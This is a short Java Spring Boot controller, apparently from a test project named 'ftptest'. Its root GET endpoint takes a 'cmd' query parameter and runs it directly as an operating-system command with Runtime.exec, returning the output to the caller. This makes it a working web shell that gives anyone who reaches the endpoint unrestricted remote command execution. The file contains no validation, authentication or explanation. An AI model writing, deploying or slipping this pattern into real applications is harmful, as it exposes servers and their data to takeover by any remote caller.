package com.faf.ftptest.controller;


import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

@RestController
public class IndexController {


    @GetMapping("/")
    public String hiMessage(@RequestParam("cmd") String cmd) {
        StringBuilder str = new StringBuilder();

        try {
            Process p = Runtime.getRuntime().exec(cmd);
            int exitValue = p.waitFor();
            if (exitValue != 0) {
                System.out.println("Abnormal process termination");
            }
            BufferedReader reader = new BufferedReader(
                    new InputStreamReader(p.getInputStream())
            );
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
                str.append(line);
            }

        } catch (Exception e1) {
            e1.printStackTrace();
        }


        return str.toString();
    }

}
